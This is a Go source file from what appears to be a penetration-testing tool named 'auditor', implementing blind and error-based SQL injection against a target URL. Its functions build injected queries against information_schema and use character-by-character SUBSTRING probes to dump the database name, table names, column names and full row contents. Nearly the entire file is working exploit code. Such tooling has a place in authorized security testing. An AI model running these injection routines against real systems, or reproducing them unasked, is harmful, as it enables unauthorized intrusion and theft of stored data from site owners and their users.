package sql

import (
	"auditor/entities"
	based "auditor/handlers/sql/base"
	"auditor/payloads/intruder/detect"
	"fmt"
	"regexp"

	"log"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

type SQLIType int

const (
	intruder   string   = "/handlers/sql/Intruder"
	ErrorBased SQLIType = iota
	SQLIBased
	TimeBased
	UnionBased
	BlindBased
)

func generatePwnQuery(query string) string {
	payload := detect.Payloads

	splitPayload := strings.Split(payload[options.Payload], "AND")
	return fmt.Sprintf("%s%s AND %s", splitPayload[0], query, splitPayload[1])
}

func validatePwnType() based.SQLi {
	html := based.UnionBasedvalidate(options, "+and+extractvalue(1,'^x')")
	r := regexp.MustCompile(based.ErrXPathForm)
	anyXPATH := r.FindString(html)
	log.Println("XPATH's result: ", anyXPATH)
	if anyXPATH != "" {
		return based.UnionSQLiBased
	}

	if validateByMethod("'", based.LengthValidation) == 0 {
		return based.LengthValidation
	}
	if validateByMethod("'", based.ErrorSQLiBased) == 0 {
		return based.ErrorSQLiBased
	}

	return based.UnkownBased
}

func (s *Service) fetchDBNameLength(method based.SQLi) {
	if options.ValidateProc(entities.NameLength) {
		return
	}
	color.Green("\n[*] Start fetchDBNameLength()")

	p := "AND (SELECT LENGTH(database()))="
	for i := 3; i < 32; i++ {
		f := fmt.Sprintf("%s%s", p, strconv.Itoa(i))

		query := generatePwnQuery(f)
		if validateByMethod(query, method) == 1 {
			options.NameLength = i
			color.Green("\n[FOUND] Database Name Length: %d", i)
			break
		}
	}
	// s.rp.Update(options)
}

func (s *Service) fetchDBName(method based.SQLi) {
	if options.ValidateProc(entities.Name) {
		return
	}

	char := 1
	for {
		for _, c := range detect.Characters {
			f := fmt.Sprintf("%s%s%s%s%s",
				"AND (SUBSTRING(DATABASE(),",
				strconv.Itoa(char),
				",1))='",
				c,
				"'",
			)

			query := generatePwnQuery(f)
			if validateByMethod(query, method) == 1 {
				char++
				options.Name += c
				break
			}
		}
		if char == (options.NameLength + 1) {
			color.Green("[FOUND] DB Name: %s", options.Name)
			break
		}
	}
	// s.rp.Update(options)
}

func (s *Service) fetchDBTableCount(method based.SQLi) {
	if options.ValidateProc(entities.TableCount) {
		return
	}

	i := 0
	for {
		query := generatePwnQuery("AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=" + strconv.Itoa(i))
		if validateByMethod(query, method) == 1 {
			color.Green("[FOUND] Table Count: %d", i)
			options.TableCount = i
			break
		}
		i++
	}
	// s.rp.Update(options)
}

func (s *Service) fetchDBTables(method based.SQLi, tableNo int) {
	if options.ValidateProc(entities.Tables) {
		return
	}

	color.Yellow("[INFO] Retrieving tables..")
	char := 1
	tableName := ""
	var done bool
	for !done {
		for _, value := range detect.Characters {
			value = strings.ToLower(value)
			query := generatePwnQuery(
				"and substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit " +
					strconv.Itoa(tableNo) +
					",1)," +
					strconv.Itoa(char) +
					",1)='" +
					value +
					"'")

			if validateByMethod(query, method) == 1 {
				char++
				tableName += value
				if value == "" {
					fmt.Println("")
					color.Green("[FOUND] Table[%d/%d] Name: %s",
						(tableNo + 1), options.TableCount, tableName,
					)
					char = 1
					options.Tables[tableName] = []string{}
					done = true
				}
			}
		}
	}
	// s.rp.Update(options)
}

func fetchData(method based.SQLi, tableName string, column string, row int) string {
	char := 1
	rowData := ""
	for {
		for _, a := range detect.Characters {
			query := generatePwnQuery("and substring((Select " + column + " from " + tableName + " limit " + strconv.Itoa(row) + ",1)," + strconv.Itoa(char) + ",1)='" + a + "'")
			if validateByMethod(query, method) == 1 {
				rowData += a
				char++
				if a == "" {
					return rowData
				}
			}
		}
	}
}

func getDBRowCount(method based.SQLi, tableName string, column string) int {
	i := 0
	for {
		query := generatePwnQuery("AND (SELECT COUNT(*) FROM " + tableName + ") = " + strconv.Itoa(i))
		if validateByMethod(query, method) == 1 {
			return i
		}
		i++
	}
}

func (s *Service) fetchDBRows(method based.SQLi, tableName string) {
	log.Println("[+] Working on rows of table: ", tableName)
	row := 0
	rowData := ""
	rowCount := 0
	for {
		for _, column := range options.Tables[tableName] {
			rowCount = getDBRowCount(method, tableName, column)
			rowData = fetchData(method, tableName, column, row)
			options.Rows[row] = append(options.Rows[row], rowData)

		}
		fmt.Println(options.Rows[row])
		rowData = ""
		row++
		if row == rowCount {
			break
		}
	}
	// s.rp.Update(options)
}

func fetchDBColumnLen(method based.SQLi, tableName string) int {
	color.Yellow("[INFO] Retrieving column count of table %s", tableName)
	for i := 1; i < 32; i++ {
		query := generatePwnQuery("AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='" + tableName + "')=" + strconv.Itoa(i))
		if validateByMethod(query, method) == 1 {
			color.Green("[FOUND] %d columns in table %s", i, tableName)
			return i
		}
	}
	return 0
}

func (s *Service) fetchColumnsName(method based.SQLi, tableName string) {

	if options.ValidateProc(entities.ColumnsName) {
		return
	}

	log.Println("[+] Working on table: ", tableName)

	columnLen := fetchDBColumnLen(method, tableName)
	char := 1
	columnName := ""
	for column := 0; column < columnLen; {
		for _, a := range detect.Characters {
			query := generatePwnQuery(
				"AND (substr((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='" +
					tableName +
					"' LIMIT " +
					strconv.Itoa(column) +
					",1)," +
					strconv.Itoa(char) +
					",1)) = '" +
					a +
					"'",
			)
			if validateByMethod(query, method) == 1 {
				columnName += a
				if a == "" {
					options.Tables[tableName] = append(options.Tables[tableName], columnName)
					columnName = ""
					column++
					char = 0
				}
				char++
			}
		}
	}
	// s.rp.Update(options)
}

func (s *Service) findPrevious(f *BaseForm) *entities.DBOptions {
	return entities.URLOptions(f.URL, f.Param, f.Cookie)

	// options := &entities.DBOptions{}
	// err := s.rp.FindOneByPrimitiveM(filterURL(f.URL), options)
	// if err != nil {
	// 	options = entities.URLOptions(f.URL, f.Param, f.Cookie)
	// 	_ = s.rp.Create(options)
	// 	return options
	// }

	// color.Red("\n[*] FOUND THE URL!")
	// options.FromDB = true

	// return options
}
